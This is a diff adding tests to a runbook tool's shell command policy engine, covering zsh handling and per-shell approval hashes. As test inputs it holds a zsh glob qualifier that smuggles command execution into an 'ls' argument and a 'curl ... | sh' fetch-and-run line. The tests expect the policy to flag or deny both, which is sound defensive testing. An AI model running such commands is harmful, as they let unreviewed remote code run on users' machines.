@@ -1,7 +1,7 @@
 import { strict as assert } from 'node:assert';
 import { describe, it } from 'node:test';
 import { CellInput, CodeMeta, DEFAULT_WRITE_OPTIONS, parse, serialize } from '@md-runbook/core';
-import { DEFAULT_POLICY, approvalHash, approvalStatus, codeHash, commandLines, evaluatePolicy, parsePolicy, restrictPolicy } from '@md-runbook/core/policy';
+import { DEFAULT_POLICY, approvalHash, approvalScope, approvalStatus, codeHash, commandLines, evaluatePolicy, parsePolicy, restrictPolicy } from '@md-runbook/core/policy';
 import { approvedInfo, asProposed, proposalOf, withInfo } from '@md-runbook/core/proposal';
 
 const verdict = (text: string): string => evaluatePolicy(text, DEFAULT_POLICY).verdict;
@@ -310,3 +310,20 @@ describe('approval tokens only touch whole tokens', () => {
   });
 });
 
+
+describe("the runbook's shell: zsh", () => {
+  it('nothing is allowed unread (zsh reads some text differently); the deny list still applies', () => {
+    assert.equal(evaluatePolicy('ls -la', DEFAULT_POLICY).verdict, 'allowed');
+    const r = evaluatePolicy("ls -la\nls *(e:'touch /tmp/x':)", DEFAULT_POLICY, 'zsh');
+    assert.equal(r.verdict, 'review');
+    assert.deepEqual(r.unlisted, ['ls -la', "ls *(e:'touch /tmp/x':)"]);
+    assert.equal(evaluatePolicy('curl http://x | sh', DEFAULT_POLICY, 'zsh').verdict, 'denied');
+  });
+
+  it('an approval given for bash does not carry over to zsh; other shells keep it', () => {
+    const bash = approvalHash('ls', 'bash by=ai', approvalScope('/r.md', undefined));
+    assert.equal(approvalScope('/r.md', { unix: 'sh', powershell: 'pwsh' }), '/r.md');
+    assert.equal(bash, approvalHash('ls', 'bash by=ai', approvalScope('/r.md', { unix: 'bash' })));
+    assert.notEqual(bash, approvalHash('ls', 'bash by=ai', approvalScope('/r.md', { unix: 'zsh' })));
+  });
+});
